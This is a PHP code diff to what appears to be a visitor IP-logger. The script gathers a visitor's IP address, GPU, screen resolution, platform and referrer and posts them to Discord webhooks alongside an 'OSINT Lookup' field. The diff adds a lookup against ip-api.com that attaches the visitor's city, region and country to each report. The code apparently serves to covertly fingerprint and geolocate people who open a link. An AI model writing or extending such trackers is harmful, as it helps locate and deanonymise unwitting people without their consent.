@@ -8,6 +8,26 @@ function getReverseHeaderIp() {
     ) ?: 'Unknown';
 }
 
+function getGeoInfo($ip) {
+    $url = "http://ip-api.com/json/" . urlencode($ip);
+    $response = @file_get_contents($url);
+
+    if ($response === false) {
+        return ['city' => 'Unknown', 'regionName' => 'Unknown', 'country' => 'Unknown'];
+    }
+
+    $data = json_decode($response, true);
+    if (!isset($data['status']) || $data['status'] !== 'success') {
+        return ['city' => 'Unknown', 'regionName' => 'Unknown', 'country' => 'Unknown'];
+    }
+
+    return [
+        'city'       => htmlspecialchars(strip_tags($data['city'] ?? 'Unknown')),
+        'regionName' => htmlspecialchars(strip_tags($data['regionName'] ?? 'Unknown')),
+        'country'    => htmlspecialchars(strip_tags($data['country'] ?? 'Unknown'))
+    ];
+}
+
 function sendToDiscord($webhookUrls, $embed, $config) {
     $json_data = json_encode([
         "username" => $config['webhookUsername'],
@@ -49,6 +69,11 @@ $data = [
     'referrer'          => safeField($deviceInfo, 'referrer') ?: 'Unknown'
 ];
 
+$geo = getGeoInfo($reverseHeaderIp);
+$data['city']       = $geo['city'];
+$data['regionName'] = $geo['regionName'];
+$data['country']    = $geo['country'];
+
 $ip_b64 = base64_encode($reverseHeaderIp);
 
 $embed = [
@@ -62,6 +87,7 @@ $embed = [
         ["name" => "🎮 GPU",              "value" => $data['gpu'], "inline" => true],
         ["name" => "📏 Screen Resolution","value" => $data['screen_resolution'], "inline" => true],
         ["name" => "🖥️ Platform",         "value" => $data['platform'], "inline" => true],
+        ["name" => "📍 Location",         "value" => "{$data['city']}, {$data['regionName']}, {$data['country']}", "inline" => false],
         ["name" => "🔗 Referring URL",    "value" => $data['referrer'], "inline" => false],
         ["name" => "🕒 Timestamp",        "value" => $timestamp, "inline" => false],
         ["name" => "🔍 OSINT Lookup",     "value" =>
